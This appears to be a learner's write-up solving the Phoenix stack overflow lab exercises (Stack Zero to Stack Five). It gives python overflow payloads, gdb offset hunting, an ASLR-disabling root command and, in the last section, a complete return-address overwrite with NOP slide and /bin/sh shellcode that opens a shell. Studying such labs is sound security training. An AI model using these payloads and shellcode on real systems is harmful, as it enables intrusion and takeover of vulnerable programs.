# Stack overflow

There is multiple way of controlling the flow of a program, by overriding some part of the memory. In this section we will focus on stack memory overflow.

For those examples, you will need to install Phoenix: https://exploit.education/phoenix/getting-started/

## Stack Zero

### Exercise

Description: https://exploit.education/phoenix/stack-zero/

### Solution

`gets` function is not limited on the buffer size, causing possible overflow of variable that are stored in lower addresses.

The goal here is to send a content too fill the buffer, and override the `changeme` variable that is located next to the end of the `buffer` in the stack.

```
$ ./stack-zero 
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Well done, the 'changeme' variable has been changed!
```

## Stack One

### Exercise

Description: https://exploit.education/phoenix/stack-one/

### Solution

The solution is similar to the previous exercise, but we have to control what value we assign the variable `changeme` to.

```
$ ./stack-one HELLO
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x00000000, we want 0x496c5962

$ ./stack-one `python -c 'print ("A"*64)+"\x62\x59\x6c\x49" '`
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Two

### Exercise

Description: https://exploit.education/phoenix/stack-two/

### Solution

The solution is similar to the previous exercise, but we have to control what value we assign the variable `changeme` to (using an environment variable).

```
$ ExploitEducation=HELLO ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Almost! changeme is currently 0x00000000, we want 0x0d0a090a

$ ExploitEducation=`python -c 'print ("A"*64)+"\x0a\x09\x0a\x0d"'` ./stack-two
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack Three

### Exercise

Description: https://exploit.education/phoenix/stack-three/

### Solution

The solution is similar to the previous exercise, but we have to control the address the function pointer `fp` will call.

We will assign it to the `complete_level` function (located at 0x0040069d)

```
$ gdb ./stack-three
(gdb) info functions 
…
0x000000000040069d  complete_level
0x00000000004006b5  main
…

$ python -c 'print ("A"*64)+"\x9d\x06\x40" ' | ./stack-three 
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

## Stack Four

### Exercise

Description: https://exploit.education/phoenix/stack-four/

### Solution

The solution is similar to the previous exercise, but we have to control the control flow by overriding the `rip` address after returning from the main function.

This address is stored at the begging of the stack frame. (See CPU / Stack for more information)

We will assign it to the `complete_level` function (located at 0x0040069d)

```
$ gdb ./stack-four 
(gdb) info functions 
...
0x000000000040061d  complete_level
0x0000000000400635  start_level
…

$ python -c 'print ("A"*88)+"\x1d\x06\x40\x00\x00\x00\x00\x00" ' | ./stack-four
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

## Stack Five

### Exercise

Description: https://exploit.education/phoenix/stack-five/

### Solution

The goal of this challenge is to execute some code from the stack. To proceed, we will have to inject valid assembler code in the stack, update `rip` to point to it.

Some piece of assembler, named `shellcode` are available in shell storm. They are designed to take control of the program workflow, by creating, by example, a remote shell.

In this challenge, we will use the following one: http://shell-storm.org/shellcode/files/shellcode-806.php

Stack content can be different, from an execution to another. To avoid, jumping to the wrong address, we use the `nop slide` technique: https://en.wikipedia.org/wiki/NOP_slide

First, you need to disable stack address randomization: (root)
```
sudo -i
# echo 0 > /proc/sys/kernel/randomize_va_space
```

```
$ gdb ./stack-five

(gdb) set disassembly-flavor intel

(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d <+0>:     push   rbp
   0x000000000040058e <+1>:     mov    rbp,rsp
   0x0000000000400591 <+4>:     add    rsp,0xffffffffffffff80
   0x0000000000400595 <+8>:     lea    rax,[rbp-0x80]
   0x0000000000400599 <+12>:    mov    rdi,rax
   0x000000000040059c <+15>:    call   0x4003f0 <gets@plt>
   0x00000000004005a1 <+20>:    nop
   0x00000000004005a2 <+21>:    leave
   0x00000000004005a3 <+22>:    ret
End of assembler dump.
```

Put a breakpoint before returning to caller address:
```
(gdb) b *0x00000000004005a3
Breakpoint 1 at 0x4005a3

(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/i $rip
>x/8wx $rsp
>end

(gdb) r
Starting program: /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
=> 0x4005a3 <start_level+22>:   ret
0x7fffffffe4e8: 0x004005c7      0x00000000      0xffffe558      0x00007fff
0x7fffffffe4f8: 0x00000000      0x00000002      0x00000002      0x00000000

(gdb) info registers
rax            0x7fffffffe460   140737488348256
rbx            0x7fffffffe558   140737488348504
rcx            0x8080808080808080       -9187201950435737472
rdx            0x7fffffffe4bf   140737488348351
rsi            0xfefefefefefefeff       -72340172838076673
rdi            0x7fffffffe464   140737488348260
rbp            0x7fffffffe500   0x7fffffffe500
rsp            0x7fffffffe4e8   0x7fffffffe4e8
r8             0x7fffffffe460   140737488348256
r9             0x7fffffffe4bf   140737488348351
r10            0x1      1
r11            0x246    582
r12            0x7fffffffe570   140737488348528
r13            0x4005a4 4195748
r14            0x0      0
r15            0x0      0
rip            0x4005a3 0x4005a3 <start_level+22>
eflags         0x202    [ IF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0
```

The top of the stack is located at `0x7fffffffe4e8`.

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGHHHHHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQRRRRRRRRSSSSSSSSTTTTTTTT

Program received signal SIGSEGV, Segmentation fault.
=> 0x4005a3 <start_level+22>:   ret
0x7fffffffe4e8: 0x52525151      0x52525252      0x53535252      0x53535353
0x7fffffffe4f8: 0x54545353      0x54545454      0x00005454      0x00000000
0x00000000004005a3 in start_level ()
```

We notice that the program will jump to `RRQQ` (0x52525151) and that :

We will then prepare a payload:  
`{buffer}{return_address}{nop_slide}{shellcode}` (where **return_address** should point to the **nop_slide**).

```python
import struct

# Fill buffer until %RIP
buffer_data  = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGG"
buffer_data += "HHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNN"
buffer_data += "OOOOOOOOPPPPPPPPQQQQQQQQ"

# Encode 64 bit address
rip = struct.pack("I", 0xffffe4e8+120)
rip_2 = struct.pack("Q", 0x7fff);

# NOP slide
nop = "\x90"*200

# Shell code, creating a /bin/sh process
payload      = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7"
payload     += "\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

print buffer_data + rip + rip_2 + nop + payload
```

Then we execute our payload:

```
$ (python ~/test.py ; cat) | /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
uname -a
Linux host 4.15.0-101-generic #102-Ubuntu SMP Mon May 11 10:07:26 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

Congratulation !